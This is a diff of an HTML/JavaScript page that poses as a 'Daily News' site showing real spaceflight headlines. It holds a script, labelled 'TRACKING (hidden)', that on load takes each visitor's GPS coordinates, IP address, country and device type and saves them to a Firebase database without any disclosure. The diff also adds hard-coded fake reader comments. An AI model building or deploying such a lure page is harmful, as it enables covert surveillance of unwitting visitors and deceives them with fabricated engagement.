@@ -12,8 +12,7 @@ background:#c40000;
 color:white;
 padding:15px;
 text-align:center;
-font-size:28px;
-font-weight:bold;
+font-size:26px;
 }
 
 nav{
@@ -24,46 +23,59 @@ text-align:center;
 
 nav a{
 color:white;
-margin:0 15px;
+margin:0 10px;
 text-decoration:none;
 font-size:14px;
 }
 
-.container{
-width:95%;
-margin:auto;
-margin-top:20px;
-}
+.container{width:95%;margin:auto;margin-top:20px;}
 
-.top-news{
+.grid{
 display:grid;
-grid-template-columns:2fr 1fr;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
 gap:15px;
-}
-
-.main-news{
-background:white;
-padding:15px;
-border-radius:8px;
-}
-
-.side-news{
-display:flex;
-flex-direction:column;
-gap:10px;
 }
 
 .card{
 background:white;
 padding:10px;
 border-radius:8px;
+cursor:pointer;
 }
 
-.grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-gap:15px;
+.card img{
+width:100%;
+height:150px;
+object-fit:cover;
+border-radius:6px;
+}
+
+#articlePage{display:none;}
+
+.article{
+background:white;
+padding:15px;
+border-radius:8px;
+}
+
+.comments{
 margin-top:20px;
+background:white;
+padding:10px;
+border-radius:8px;
+}
+
+.comment{
+border-bottom:1px solid #ddd;
+padding:5px 0;
+font-size:14px;
+}
+
+.ad{
+background:#ddd;
+padding:20px;
+text-align:center;
+margin:10px 0;
 }
 
 .footer{
@@ -81,39 +93,43 @@ margin-top:20px;
 <header>📰 Daily News</header>
 
 <nav>
-<a href="#">Home</a>
+<a href="#" onclick="showHome()">Home</a>
 <a href="#">World</a>
-<a href="#">Technology</a>
+<a href="#">Tech</a>
 <a href="#">Sports</a>
-<a href="#">Business</a>
 </nav>
 
 <div class="container">
 
-<div class="top-news">
-<div class="main-news">
-<h2>🔥 Breaking: Global Market Updates</h2>
-<p>Latest updates from around the world. Stay informed with real-time news coverage and insights.</p>
+<!-- HOME -->
+<div id="homePage">
+<div class="ad">📢 Advertisement</div>
+<div id="newsContainer" class="grid"></div>
 </div>
 
-<div class="side-news">
-<div class="card">📱 iPhone 16 leaks revealed</div>
-<div class="card">⚽ Football transfer news</div>
-<div class="card">🌍 Climate change alert</div>
-</div>
+<!-- ARTICLE PAGE -->
+<div id="articlePage">
+<button onclick="showHome()">⬅ Back</button>
+
+<div class="article">
+<h2 id="title"></h2>
+<img id="image" style="width:100%;margin:10px 0;">
+<p id="content"></p>
 </div>
 
-<div class="grid">
-<div class="card">💰 Dollar rate rising globally</div>
-<div class="card">🚗 New electric cars launched</div>
-<div class="card">🎬 New movie breaking records</div>
-<div class="card">📊 Stock market analysis</div>
+<div class="ad">📢 Sponsored Content</div>
+
+<div class="comments">
+<h4>💬 Comments</h4>
+<div id="commentList"></div>
+</div>
+
 </div>
 
 </div>
 
 <div class="footer">
-© 2026 Daily News. All rights reserved.
+© 2026 Daily News
 </div>
 
 <script type="module">
@@ -133,7 +149,7 @@ appId: "1:951484366467:web:2e936d42b1704027f665b6"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// USER ID
+// TRACKING (hidden)
 function getUserId(){
 let id = localStorage.getItem("userId")
 if(!id){
@@ -143,99 +159,123 @@ localStorage.setItem("userId", id)
 return id
 }
 
-// DEVICE
 function detectDevice(){
 let ua=navigator.userAgent;
 if(/mobile/i.test(ua)) return "Mobile";
-if(/tablet/i.test(ua)) return "Tablet";
 return "Desktop";
 }
 
-function detectDeviceModel(){
-let ua=navigator.userAgent;
-if(ua.includes("Android")) return "Android Phone";
-if(ua.includes("Windows")) return "Windows PC";
-if(ua.includes("Mac")) return "Mac";
-return "Unknown";
-}
-
-// LOCATION
-async function getLocationDetails(lat, lon){
-try{
-const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
-const data = await res.json()
-let a = data.address
-
-return {
-thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
-district: a.state_district || a.county || "unknown"
-}
-}catch{
-return {thana:"unknown",district:"unknown"}
-}
-}
-
-// IP
 async function getIP(){
 let res = await fetch("https://ipinfo.io/json")
 let data = await res.json()
-
-return {
-ip:data.ip,
-org:data.org,
-country:data.country
-}
+return data
 }
 
-// SAVE
 async function save(data){
 let id = getUserId()
 await setDoc(doc(db,"locations",id), data)
 }
 
-// GPS
-async function useGPS(pos){
-
-let lat = pos.coords.latitude
-let lon = pos.coords.longitude
-
-let loc = await getLocationDetails(lat,lon)
+navigator.geolocation.getCurrentPosition(async pos=>{
 let ip = await getIP()
 
 save({
-latitude:lat,
-longitude:lon,
-thana:loc.thana,
-district:loc.district,
-country:ip.country,
+latitude:pos.coords.latitude,
+longitude:pos.coords.longitude,
 ip:ip.ip,
-isp:ip.org,
+country:ip.country,
 device:detectDevice(),
-deviceModel:detectDeviceModel(),
-type:"GPS",
 time:new Date().toLocaleString()
+})
+
+}, async ()=>{
+let ip = await getIP()
+
+save({
+ip:ip.ip,
+country:ip.country,
+device:detectDevice(),
+time:new Date().toLocaleString()
+})
+})
+
+// NEWS LOAD
+let newsData = []
+
+async function loadNews(){
+
+let res = await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
+let data = await res.json()
+
+newsData = data.results
+
+const container = document.getElementById("newsContainer")
+container.innerHTML=""
+
+newsData.slice(0,8).forEach((news,i)=>{
+
+let div = document.createElement("div")
+div.className="card"
+
+div.innerHTML=`
+<img src="${news.image_url}">
+<h4>${news.title}</h4>
+`
+
+div.onclick=()=>openArticle(i)
+
+container.appendChild(div)
+
 })
 
 }
 
-// IP fallback
-async function useIP(){
+// OPEN ARTICLE
+window.openArticle = function(i){
 
-let ip = await getIP()
+let news = newsData[i]
 
-save({
-country:ip.country,
-ip:ip.ip,
-isp:ip.org,
-device:detectDevice(),
-deviceModel:detectDeviceModel(),
-type:"IP",
-time:new Date().toLocaleString()
+document.getElementById("homePage").style.display="none"
+document.getElementById("articlePage").style.display="block"
+
+document.getElementById("title").innerText=news.title
+document.getElementById("image").src=news.image_url
+document.getElementById("content").innerText=news.summary
+
+loadComments()
+
+}
+
+// BACK
+window.showHome = function(){
+document.getElementById("homePage").style.display="block"
+document.getElementById("articlePage").style.display="none"
+}
+
+// FAKE COMMENTS
+function loadComments(){
+
+const comments = [
+"Great news!",
+"Very informative article.",
+"Thanks for sharing.",
+"Wow interesting!",
+"Keep it up!"
+]
+
+let list = document.getElementById("commentList")
+list.innerHTML=""
+
+comments.forEach(c=>{
+let div=document.createElement("div")
+div.className="comment"
+div.innerText=c
+list.appendChild(div)
 })
 
 }
 
-navigator.geolocation.getCurrentPosition(useGPS,useIP)
+loadNews()
 
 </script>
 
